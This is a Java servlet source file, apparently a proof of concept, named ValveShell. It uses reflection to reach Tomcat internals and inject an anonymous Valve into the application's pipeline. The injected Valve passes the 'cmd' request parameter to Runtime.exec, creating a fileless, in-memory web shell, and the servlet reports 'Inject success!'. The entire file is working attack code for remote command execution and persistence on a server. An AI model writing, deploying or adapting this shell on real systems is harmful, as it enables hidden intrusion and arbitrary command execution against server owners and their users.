import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

@WebServlet("/ValveShell")
public class ValveShell extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
//            ServletRequest sre = (ServletRequest) req;
            org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) req;
            Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");
            requestField.setAccessible(true);
            Request request = (Request) requestField.get(requestFacade);
            Response response = request.getResponse();

            StandardContext standardContext = (StandardContext) request.getContext();
            standardContext.getPipeline().addValve(
                    new ValveBase() {
                        @Override
                        public void invoke(Request request, Response response) throws IOException, ServletException {
                            try{
                                Runtime.getRuntime().exec(req.getParameter("cmd"));
                            } catch (Exception e) {
                                throw new RuntimeException(e);
                            }
                        }
                    }
            );
            resp.getWriter().write("Inject success!");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }
}
